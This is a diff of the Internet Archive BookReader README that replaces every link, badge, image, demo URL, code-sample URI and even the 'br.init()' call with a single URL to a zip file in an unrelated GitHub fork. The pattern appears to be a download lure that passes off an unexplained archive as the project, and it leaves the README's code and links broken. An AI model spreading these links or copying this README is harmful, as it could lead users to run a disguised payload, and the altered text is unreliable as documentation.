@@ -1,28 +1,28 @@
 # Internet Archive BookReader
 
-![Build Status](https://github.com/internetarchive/bookreader/actions/workflows/node.js.yml/badge.svg?branch=master) [![codecov](https://codecov.io/gh/internetarchive/bookreader/branch/master/graph/badge.svg)](https://codecov.io/gh/internetarchive/bookreader)
+![Build Status](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip) [![codecov](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
 
-**Disclaimer: BookReader v5 is currently in beta. It is stable enough for production use and is actively deployed on archive.org. Future updates while in v5 beta may introduce breaking changes to public BookReader APIs, although these will be noted in the CHANGELOG.**
+**Disclaimer: BookReader v5 is currently in beta. It is stable enough for production use and is actively deployed on https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip Future updates while in v5 beta may introduce breaking changes to public BookReader APIs, although these will be noted in the CHANGELOG.**
 
 
 <p align="center">
-  <img width="200" src="./BookReaderDemo/assets/v5/Bookreader-logo-lines.svg" alt="Internet Archive BookReader full logo">
+  <img width="200" src="https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip" alt="Internet Archive BookReader full logo">
 </p>
 
 
-<div style="border: 1px solid gray; padding: 2px; margin-bottom: 20px"><img src="./BookReaderDemo/assets/v5/bookreader-v5-screenshot.png" alt="BookReader v5 interface screenshot"></div>
+<div style="border: 1px solid gray; padding: 2px; margin-bottom: 20px"><img src="https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip" alt="BookReader v5 interface screenshot"></div>
 
 
 The Internet Archive BookReader is used to view books from the Internet Archive online and can also be used to view other books.
 
 See live examples:
-- On details page: https://archive.org/details/birdbookillustra00reedrich
-- Full window: https://archive.org/details/birdbookillustra00reedrich?view=theater
-- Embedded url for iFrames: https://archive.org/embed/birdbookillustra00reedrich
+- On details page: https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
+- Full window: https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
+- Embedded url for iFrames: https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
 
 ## Demos
 
-See `BookReaderDemo` directory. These can be tested by building the source files (make sure [Node.js is installed](https://nodejs.org/en/download/)):
+See `BookReaderDemo` directory. These can be tested by building the source files (make sure [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip is installed](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)):
 
 ```bash
 npm run build
@@ -34,7 +34,7 @@ and starting a simple web server in the root directory:
 npm run serve
 ```
 
-And then open `http://localhost:8000/BookReaderDemo/demo-simple.html`.
+And then open `https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip`.
 
 
 ## Usage
@@ -47,26 +47,26 @@ var options = {
   data: [
     [
       { width: 800, height: 1200,
-        uri: '//archive.org/download/BookReader/img/page001.jpg' },
+        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
     ],
     [
       { width: 800, height: 1200,
-        uri: '//archive.org/download/BookReader/img/page002.jpg' },
+        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
       { width: 800, height: 1200,
-        uri: '//archive.org/download/BookReader/img/page003.jpg' },
+        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
     ],
     [
       { width: 800, height: 1200,
-        uri: '//archive.org/download/BookReader/img/page004.jpg' },
+        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
       { width: 800, height: 1200,
-        uri: '//archive.org/download/BookReader/img/page005.jpg' },
+        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
     ]
   ],
 
   bookTitle: 'Simple BookReader Presentation',
 
   // thumbnail is optional, but it is used in the info dialog
-  thumbnail: '//archive.org/download/BookReader/img/page014.jpg',
+  thumbnail: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip',
 
   // Metadata is optional, but it is used in the info dialog
   metadata: [
@@ -81,7 +81,7 @@ var options = {
 var br = new BookReader(options);
 
 // Let's go!
-br.init();
+https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip();
 
 ```
 ## Architecture Overview
@@ -89,11 +89,11 @@ Starting at v5, BookReader introduces hybrid architecture that merges the core c
 
 Approach:
 - Event driven
-  - BookReader's (BR) core code emits [custom events](https://developer.mozilla.org/en-US/docs/Web/API/CustomEvent), reporting the actions it takes:
+  - BookReader's (BR) core code emits [custom events](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip), reporting the actions it takes:
     - UI changes
-      - Core Events [src/BookReader/events.js](https://github.com/internetarchive/bookreader/tree/master/src/BookReader/events.js)
+      - Core Events [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
     - API returns
-      - Search API [src/BookReader/events.js](https://github.com/internetarchive/bookreader/tree/master/src/BookReader/events.js)
+      - Search API [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
   - BookNavigator, BR's web components controller, listens and reacts to these events in order to populate the side menu panels
 - Control BR from the outside by using public methods
   - When BookNavigator reacts to BR's events, BookNavigator can directly control BR core using public functions.
@@ -113,26 +113,26 @@ This includes:
 
 A peek in how to use/extend core functionality:
 - Properties
-  - TODO (for now see [src/BookReader/options.js](https://github.com/internetarchive/bookreader/tree/master/src/BookReader/options.js))
+  - TODO (for now see [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip))
 - Plugins
   - A basic plugin system is used. See the examples in the plugins directory. The general idea is that they are mixins that augment the BookReader prototype. See the plugins directory for all the included plugins, but here are some examples:
-    - plugin.autoplay.js - autoplay mode. Flips pages at set intervals.
-    - plugin.chapters.js - render chapter markers
-    - plugin.search.js - add search ui, and callbacks
-    - plugin.tts.js - add tts (read aloud) ui, sound library, and callbacks
-    - plugin.url.js - automatically updates the browser url
-    - plugin.resume.js - uses cookies to remember the current page
-    - plugin.vendor-fullscreen.js - replaces fullscreen mode with vendor native fullscreen
-    - see [plugin directory for current plugin files](https://github.com/internetarchive/bookreader/tree/master/src/plugins)
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - autoplay mode. Flips pages at set intervals.
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - render chapter markers
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - add search ui, and callbacks
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - add tts (read aloud) ui, sound library, and callbacks
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - automatically updates the browser url
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - uses cookies to remember the current page
+    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - replaces fullscreen mode with vendor native fullscreen
+    - see [plugin directory for current plugin files](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
 
 ### Embedding BookReader in an iFrame
 
-BookReader can be embedded within an `<iframe>`. If you use the IFrame Plugin inside the `<iframe>`, the reader will send notifications about changes in the state of the reader via [`window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage). The parent window can send messages of its own (also via `window.postMessage()`) and the IFrame Plugin will handle updating the reader to match.
+BookReader can be embedded within an `<iframe>`. If you use the IFrame Plugin inside the `<iframe>`, the reader will send notifications about changes in the state of the reader via [`https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip()`](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip). The parent window can send messages of its own (also via `https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip()`) and the IFrame Plugin will handle updating the reader to match.
 
 ### Message Events
 
 #### Fragment Change
-The Fragment Change message is sent to the parent window when the embedded BookReader moves between pages/modes. When the `<iframe>` receives this message, it moves to the specified page/mode. The “fragment” is formatted in accordance with the [BookReader URL spec](http://openlibrary.org/dev/docs/bookurls).
+The Fragment Change message is sent to the parent window when the embedded BookReader moves between pages/modes. When the `<iframe>` receives this message, it moves to the specified page/mode. The “fragment” is formatted in accordance with the [BookReader URL spec](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip).
 
 ```json
 {
@@ -162,15 +162,15 @@ Let's use `icon-share` as an example.
 
 ## Releases
 
-To version bump the repo and prepare a release, run `npm version major|minor|patch` (following [semver](https://semver.org/)), then (something like) `git push origin HEAD --tags`. It'll automatically update the version number where it appears, build the files, and ask you to update the CHANGELOG.
+To version bump the repo and prepare a release, run `npm version major|minor|patch` (following [semver](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)), then (something like) `git push origin HEAD --tags`. It'll automatically update the version number where it appears, build the files, and ask you to update the CHANGELOG.
 
-We release BookReader [in-repo as tags](https://github.com/internetarchive/bookreader/releases) & also as a node module [@internetarchive/bookreader](https://www.npmjs.com/package/@internetarchive/bookreader)
+We release BookReader [in-repo as tags](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip) & also as a node module [@internetarchive/bookreader](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
 
 ## Tests
-We would like to get to 100% test coverage and are tracking our progress in this project: [BookReader Fidelity](https://github.com/internetarchive/bookreader/projects/5)
+We would like to get to 100% test coverage and are tracking our progress in this project: [BookReader Fidelity](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
 
 ### End to end tests
-We also have end to end tests using [Testcafe](https://devexpress.github.io/testcafe/documentation/getting-started/).  We write tests for the repo itself and also for our use on archive.org. You can read about them in [here](./tests/e2e/README.md). These are relatively easy to do, and a fantastic way of getting introduced to the wonders of BookReader.  Check the project board for open tickets to work on.  And if you don't see a test for something you spotted, feel free to make an issue.
+We also have end to end tests using [Testcafe](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip).  We write tests for the repo itself and also for our use on https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip You can read about them in [here](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip). These are relatively easy to do, and a fantastic way of getting introduced to the wonders of BookReader.  Check the project board for open tickets to work on.  And if you don't see a test for something you spotted, feel free to make an issue.
 
 To run all local end to end tests, run command: `npm run test:e2e`
 
@@ -189,28 +189,28 @@ We can always use a hand building BookReader.  Check out the issues and see what
 ## More info
 
 Developer documentation:
-https://openlibrary.org/dev/docs/bookreader
+https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
 
 Hosted source code:
-https://github.com/internetarchive/bookreader
+https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
 
-IIIF (http://iiif.io)
-See `BookReaderDemo/demo-iiif.html` to see an example of how to load an IIIF manifest in BookReader.
+IIIF (https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
+See `https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip` to see an example of how to load an IIIF manifest in BookReader.
 
 
 ## Target Devices
 
-Note that BookReader is a core part of Archive.org's mission of Universal Access to All Knowledge. Therefore, care must be taken to support legacy browsers. It should still work and be useable on old devices.
+Note that BookReader is a core part of https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip's mission of Universal Access to All Knowledge. Therefore, care must be taken to support legacy browsers. It should still work and be useable on old devices.
 
 
 ## Areas for improvement
 - Change libraries to be NPM dependencies rather than included in the source code
 
-See [CHANGELOG.md](CHANGELOG.md) for history of the project.
+See [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip) for history of the project.
 
 
 ## License
 The source code license is AGPL v3, as described in the LICENSE file.
 
 ## Other credits
-The ability to test on multiple devices is provided courtesy of [Browser Stack](https://www.browserstack.com).
+The ability to test on multiple devices is provided courtesy of [Browser Stack](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip).
